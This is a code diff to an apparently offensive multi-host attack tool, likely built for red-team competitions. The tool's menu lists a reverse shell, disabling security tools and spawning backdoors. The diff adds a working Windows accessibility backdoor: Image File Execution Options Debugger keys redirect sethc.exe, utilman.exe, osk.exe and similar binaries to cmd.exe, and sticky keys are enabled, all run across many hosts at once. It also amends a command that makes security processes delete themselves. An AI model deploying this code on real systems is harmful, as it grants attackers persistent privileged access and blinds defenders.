@@ -22,9 +22,7 @@ from InquirerPy.utils import get_style
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 ALL_HOSTS = [
-    # List Teams Here
-
-    # Custom IPs
+    # All Hosts
 ]
 
 ALL_DC = [
@@ -295,7 +293,7 @@ def main_interface():
             Choice(value="SHELL", name="Spawn a Reverse Shell"),
             Choice(value="FIREWALL", name="Reset Firewalls"),
             Choice(value="IFEO", name="Disable Security & Monitoring Tools"),
-            Choice(value="UTILIITY", name="Spawn Utility Backdoors (Coming Soon)"),
+            Choice(value="UTILITY", name="Spawn Utility Backdoors"),
             Choice(value="SSH", name="Drop SSH Keys (Coming Soon)"),
             Choice(value="CALLBACK", name="Test Connections"),
             Choice(value="VIEW_CALLBACKS", name="View All Connections"),
@@ -1107,9 +1105,27 @@ def main():
             command = (
                 f"for %i in ({processes_string}) do @reg add "
                 f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
-                f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\""
+                f"/v Debugger /t REG_SZ /d \"cmd.exe /c del /f /q \"%i\"\" /f"
             )
             mass_execution(command)
+        elif action == "UTILITY":
+            target_processes = (
+                "sethc.exe", "utilman.exe", "osk.exe", "displayswitch.exe",
+                "magnify.exe", "narrator.exe"
+            )
+
+            processes_string = " ".join(target_processes)
+            command = (
+                f"reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_SZ /d \"\" /f & "
+                f"reg add \"HKCU\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"510\" /f & "
+                f"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Accessibility\" /v \"Configuration\" /t REG_SZ /d \"stickykeys\" /f & "
+                f"for %i in ({processes_string}) do @reg add "
+                f"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%i\" "
+                f"/v Debugger /t REG_SZ /d cmd.exe /f"
+            )
+            mass_execution(command)
+        elif action == "SSH":
+            print("SSH Key Dropping coming soon!")
         elif action == "CALLBACK":
             command = "whoami"
             mass_execution(command, callback=True)
